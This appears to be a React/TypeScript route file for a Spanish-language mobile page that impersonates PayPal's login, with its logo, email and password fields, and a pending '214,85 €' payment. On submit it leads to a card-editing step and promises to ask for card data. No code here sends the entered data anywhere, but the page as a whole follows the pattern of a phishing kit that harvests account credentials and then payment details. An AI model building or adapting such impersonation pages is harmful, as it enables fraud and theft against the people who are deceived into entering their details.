import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { PhoneShell } from "@/components/PhoneShell";
import { PayPalLogo } from "@/components/PayPalLogo";

export const Route = createFileRoute("/paypal")({
  component: PayPalPage,
});

function PayPalPage() {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const onSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    navigate({ to: "/editar-tarjeta" });
  };

  return (
    <PhoneShell showHelp={false}>
      <div className="flex justify-center mt-4 mb-6">
        <PayPalLogo className="h-10" />
      </div>
      <p className="text-center text-sm text-gray-600 mb-6">
        Inicia sesión para autorizar el pago de <span className="font-semibold">214,85 €</span>
      </p>

      <form onSubmit={onSubmit} className="space-y-4">
        <div>
          <label className="text-xs text-gray-600">Correo o número de móvil</label>
          <input
            type="text"
            required
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="mt-1 w-full border border-gray-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#0070E0]"
          />
        </div>
        <div>
          <label className="text-xs text-gray-600">Contraseña</label>
          <input
            type="password"
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="mt-1 w-full border border-gray-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#0070E0]"
          />
        </div>

        <button
          type="submit"
          className="w-full py-3.5 rounded-full bg-[#0070E0] hover:bg-[#003087] transition text-white font-semibold text-sm"
        >
          Iniciar sesión
        </button>

        <p className="text-center text-xs text-gray-500">
          Tras confirmar, te pediremos los datos de tu tarjeta para finalizar.
        </p>
      </form>
    </PhoneShell>
  );
}
